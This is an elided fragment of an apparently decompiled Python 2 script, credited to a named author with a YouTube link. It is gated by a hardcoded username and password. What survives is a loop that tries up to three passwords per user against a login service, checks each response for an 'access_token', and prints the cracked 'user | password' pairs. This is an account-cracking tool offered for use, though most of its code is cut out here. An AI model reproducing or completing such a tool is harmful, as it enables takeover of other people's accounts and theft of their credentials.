...
# Decompiled By Talha Zubayer

# Youtube : https://youtube.com/channel/UC3wMDs7a2HF8b2uLXlRx2bw

# uncompyle6 version 

# Original written By Talha Zubayer

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'NILOY'

__copyright = 'All rights reserved . Copyright  Talha Zubayer'

CorrectUsername = 'NILOY'

CorrectPassword = 'BANGLADESH '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [Sucessfull-NILOY]  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  [Sucessfull-NILOY] ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  [Sucessfull-NILOY] ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  [Sucessfull-NILOY]  ' + k + c + user + '  |  ' + pass3
